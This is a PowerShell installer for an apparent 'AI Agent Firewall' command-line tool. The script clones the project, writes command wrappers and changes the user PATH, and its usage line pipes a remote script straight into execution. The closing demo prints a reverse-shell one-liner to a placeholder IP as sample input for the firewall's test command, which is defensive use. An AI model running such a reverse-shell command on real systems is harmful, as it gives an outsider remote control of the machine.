# AI Agent Firewall Installer for Windows (PowerShell)
# Usage: irm https://raw.githubusercontent.com/devmishra2049/ai-agent-firewall/main/install.ps1 | iex

Write-Host "┌──────────────────────────────────────────────────────────────┐" -ForegroundColor Cyan
Write-Host "│  🛡️  AI AGENT FIREWALL — WINDOWS INSTALLER                    │" -ForegroundColor Cyan
Write-Host "└──────────────────────────────────────────────────────────────┘" -ForegroundColor Cyan

# Check for node
if (-not (Get-Command node -ErrorAction SilentlyContinue)) {
    Write-Host "Error: Node.js (v18+) is required but not installed." -ForegroundColor Red
    Write-Host "Please download and install Node.js from https://nodejs.org/" -ForegroundColor Yellow
    Exit
}

$InstallDir = "$HOME\.agent-firewall"
$RepoUrl = "https://github.com/devmishra2049/ai-agent-firewall.git"

Write-Host "Installing AI Agent Firewall into $InstallDir..." -ForegroundColor Yellow

if (Test-Path $InstallDir) {
    Set-Location $InstallDir
    git pull origin main --quiet
} else {
    git clone --depth 1 $RepoUrl $InstallDir --quiet
}

# Remove any conflicting third-party npm package
try {
    cmd.exe /c "npm uninstall -g agent-firewall --silent" 2>$null
} catch {}

# Create dedicated bin directory with native .cmd and .ps1 wrappers
$BinDir = "$InstallDir\bin"
if (-not (Test-Path $BinDir)) {
    New-Item -ItemType Directory -Path $BinDir -Force | Out-Null
}

$TargetScript = "$InstallDir\cli\bin\agent-firewall.js"
$CmdScript = "@echo off`r`nnode `"$TargetScript`" %*"
$PsScript = "node `"$TargetScript`" @args"

foreach ($cmd in @("aaf", "ai-firewall", "agent-firewall")) {
    Set-Content -Path "$BinDir\$cmd.cmd" -Value $CmdScript -Force
    Set-Content -Path "$BinDir\$cmd.ps1" -Value $PsScript -Force
}

# Also inject into npm global prefix if available (which is already in user's PATH)
try {
    $NpmPrefix = (cmd.exe /c "npm config get prefix").Trim()
    if ($NpmPrefix -and (Test-Path $NpmPrefix)) {
        foreach ($cmd in @("aaf", "ai-firewall", "agent-firewall")) {
            Set-Content -Path "$NpmPrefix\$cmd.cmd" -Value $CmdScript -Force
            Set-Content -Path "$NpmPrefix\$cmd.ps1" -Value $PsScript -Force
        }
    }
} catch {}

# Ensure $BinDir is in User Environment PATH and current session
$UserPath = [Environment]::GetEnvironmentVariable("Path", [EnvironmentVariableTarget]::User)
if ($UserPath -notlike "*$BinDir*") {
    $NewUserPath = "$BinDir;$UserPath"
    [Environment]::SetEnvironmentVariable("Path", $NewUserPath, [EnvironmentVariableTarget]::User)
}
$env:Path = "$BinDir;$env:Path"

Write-Host "`n✓ AI Agent Firewall successfully installed on Windows!" -ForegroundColor Green
Write-Host "Commands available: aaf, ai-firewall, agent-firewall`n" -ForegroundColor Green

Write-Host "Try it right now:" -ForegroundColor Cyan
Write-Host "  aaf --help" -ForegroundColor White
Write-Host "  aaf test `"bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`"" -ForegroundColor White
Write-Host "  aaf watch ." -ForegroundColor White
